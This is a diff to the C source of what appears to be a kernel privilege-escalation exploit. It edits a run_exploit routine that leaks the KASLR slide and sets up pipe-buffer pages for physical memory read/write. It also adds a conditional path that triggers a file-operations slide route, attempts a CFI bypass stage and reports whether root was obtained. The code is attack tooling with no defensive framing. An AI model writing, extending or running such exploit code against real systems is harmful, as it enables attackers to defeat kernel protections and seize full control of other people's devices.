@@ -223,16 +223,41 @@ int run_exploit(int argc, char **argv) {
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
-  if (getenv("SLIDE_ONLY")) {
+  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
     return 0;
   }
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  reset_pipe_attempt();
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    return 1;
+  }
+#endif
+
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!page_base) {
+    return 1;
+  }
+  for (int attempt = 1; attempt <= 1; attempt++) {
+    int triggered = app_trigger_fops_slide_route();
+    int verified = triggered && try_cfi_stage();
+    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
+            "step=%d errno=%d\n",
+            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+    if (verified || cfi_dirty_seen) {
+      break;
+    }
+  }
+#else
   run_main_route_threads();
+#endif
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
              getpid(), atomic_load(&cfi_stage_done), root_child_done,
